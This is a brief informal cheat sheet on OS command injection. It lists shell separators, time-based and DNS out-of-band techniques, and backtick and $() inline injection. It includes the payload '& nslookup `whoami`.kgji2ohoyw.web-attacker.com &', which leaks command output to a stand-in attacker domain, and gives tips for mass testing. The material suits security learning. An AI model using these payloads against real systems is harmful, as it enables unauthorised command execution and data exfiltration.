ways of injecting: 
&
&&
|
||
time based
save to static folder
nslookup to your server
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
This causes a DNS lookup to the attacker's domain containing the result of the whoami command:

wwwuser.kgji2ohoyw.web-attacker.com

with ` and $( you can use inline command injection

if its inside " and ' you have to end the context

i would say the best way is to execure echo and see if the response inculdes the word for mass testing
